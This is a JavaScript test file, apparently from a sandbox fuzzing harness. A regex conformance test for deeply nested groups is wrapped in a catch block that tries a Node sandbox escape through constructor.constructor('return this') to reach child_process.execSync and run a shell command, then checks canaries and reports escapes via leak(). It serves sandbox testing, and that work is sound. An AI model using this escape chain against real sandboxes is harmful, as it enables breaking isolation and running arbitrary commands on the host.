try {
    var __strOriginal = 'hello';
    var __openParen = '(?:';
    var __closeParen = ')';
    var __pattern = '';
    var numParens = 200;
    for (var i = 0; i < numParens; i++)
        __pattern += __openParen;
    __pattern += __strOriginal;
    for (i = 0; i < numParens; i++)
        __pattern += __closeParen;
    var __re = new RegExp(__pattern);
    var __executed = __re.exec(__strOriginal);
    var __expected = [__strOriginal];
    __expected.index = 0;
    __expected.input = __strOriginal;
    if (__executed.length !== __expected.length) {
        $ERROR('#1: __re = new RegExp(__pattern); __executed = __re.exec(__strOriginal); __executed.length === ' + __expected.length + '. Actual: ' + __executed.length);
    }
    if (__executed.index !== __expected.index) {
        $ERROR('#2: __re = new RegExp(__pattern); __executed = __re.exec(__strOriginal); __executed.index === ' + __expected.index + '. Actual: ' + __executed.index);
    }
    if (__executed.input !== __expected.input) {
        $ERROR('#3: __re = new RegExp(__pattern); __executed = __re.exec(__strOriginal); __executed.input === ' + __expected.input + '. Actual: ' + __executed.input);
    }
    for (var index = 0; index < __expected.length; index++) {
        if (__executed[index] !== __expected[index]) {
            $ERROR('#4: __re = new RegExp(__pattern); __executed = __re.exec(__strOriginal); __executed[' + index + '] === ' + __expected[index] + '. Actual: ' + __executed[index]);
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}